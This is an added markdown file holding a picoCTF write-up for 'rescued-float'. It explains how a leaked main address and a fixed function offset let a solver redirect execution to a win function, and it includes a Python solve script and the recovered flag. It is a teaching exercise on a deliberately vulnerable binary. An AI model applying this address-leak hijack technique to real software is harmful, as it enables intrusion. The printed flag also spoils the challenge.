@@ -1,0 +1,102 @@
+# picoCTF: rescued-float Solution Walkthrough
+
+## Challenge Overview
+The challenge provides a program that:
+1. Prints the memory address of the `main` function.
+2. Prompts the user to enter a memory address (as a hexadecimal value) to jump to.
+3. Jumps to that address and executes the code there.
+
+The goal is to jump to the `win` function, which reads and prints `flag.txt`.
+
+---
+
+## Step-by-Step Analysis
+
+### 1. Analyze the Source Code
+Looking at `vuln 1.c`:
+```c
+int win() {
+  FILE *fptr;
+  char c;
+  printf("You won!\n");
+  fptr = fopen("flag.txt", "r");
+  // ... reads and prints flag ...
+}
+
+int main() {
+  signal(SIGSEGV, segfault_handler);
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  printf("Address of main: %p\n", &main);
+
+  unsigned long val;
+  printf("Enter the address to jump to, ex => 0x12345: ");
+  scanf("%lx", &val);
+  
+  void (*foo)(void) = (void (*)())val;
+  foo();
+}
+```
+
+### 2. Determine Symbol Offsets
+Since ASLR (Address Space Layout Randomization) is enabled on the target server, the base address of the executable changes on every execution. However, the *relative distance (offset)* between any two functions in the binary remains constant.
+
+We can find the offsets of `main` and `win` in the compiled binary `vuln1` using `nm`:
+```bash
+nm vuln1
+```
+
+Output highlights:
+```text
+000000000000133d T main
+00000000000012a7 T win
+```
+
+### 3. Calculate target address
+* Offset of `main`: `0x133d`
+* Offset of `win`: `0x12a7`
+
+Calculate the difference:
+$$\text{Difference} = 0x133d - 0x12a7 = 0x96$$
+
+Therefore:
+$$\text{Address of } win = \text{Address of } main - 0x96$$
+
+### 4. Solve script (`solve.py`)
+To automate connecting, parsing, calculating, and sending:
+```python
+import socket
+
+# Connect to target server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("rescued-float.picoctf.net", 63922))
+
+# Read leak
+data = s.recv(1024).decode()
+print(data)
+
+# Parse address of main
+for line in data.split('\n'):
+    if "Address of main: " in line:
+        main_addr = int(line.split("Address of main: ")[1].strip(), 16)
+        break
+
+# Compute win address
+win_addr = hex(main_addr - 0x96)
+print(f"Calculated win address: {win_addr}")
+
+# Send payload
+s.sendall(f"{win_addr}\n".encode())
+
+# Print output (Flag)
+print(s.recv(1024).decode())
+```
+
+---
+
+## Execution
+Running the script yields the flag:
+```
+picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5}
+```
+                                                             
